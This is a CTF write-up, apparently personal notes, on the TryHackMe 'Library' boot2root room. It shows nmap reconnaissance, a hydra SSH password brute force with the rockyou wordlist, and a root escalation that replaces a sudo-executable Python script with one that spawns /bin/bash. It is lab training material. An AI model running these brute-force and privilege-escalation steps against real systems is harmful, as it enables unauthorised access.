---
parent: "[[CTFs - THM]]"
---

```bash
# PLATFORM          . THM
# CTF NAME          . Library
# DESCRIPTION       . boot2root machine for FIT and bsides guatemala CTF
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/bsidesgtlibrary
```

```
sudo nmap -sSVC -T5 -p- 10.10.59.93 -oN library
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c42fc34767063204ef92918e0587d5dc (RSA)
|   256 689213ec9479dcbb7702da99bfb69db0 (ECDSA)
|_  256 43e824fcd8b8d3aac248089751dc5b7d (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### PORT 80

- From the nnamp scan, we see that there's a disallowed entry in robots.txt.

```
User-agent: rockyou 
Disallow: /
```

- I tried using the `rockyou` User-Agent both via curl and in Burp Suite but I got no different answer so I assume this is a hint to use rockyou on SSH service (since this is the only service left).

- I took a look on the website and I saw that the article was posted by the user `meliodas`.

- I've decided to bruteforce the SSH service using hydra and `meliodas` as username 

```
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.59.93 ssh -I -t 4 -v
```

```
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 14344195 to do in 8203:23h, 4 active
[22][ssh] host: 10.10.59.93   login: meliodas   password: {REDACTED}
```

- The user flag is located in `/home/meliodas/user.txt`.

- In the home directory there's also a `bak.py` script

```
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

```
-rw-r--r-- 1 root root 353 Aug 23  2019 bak.py
```

#### PRIVILEGE ESCALATION 

- We cannot write or alter that `bak.py` file but we can remove it entirely since it is in our home directory.

- Then, we can create another `bak.py` file with arbitrary content

```
import os
os.system("/bin/bash")
```

- Now, we can execute `sudo python /home/meliodas/bak.py` and get a shell as root.

- The last flag is in `/root/root.txt`.

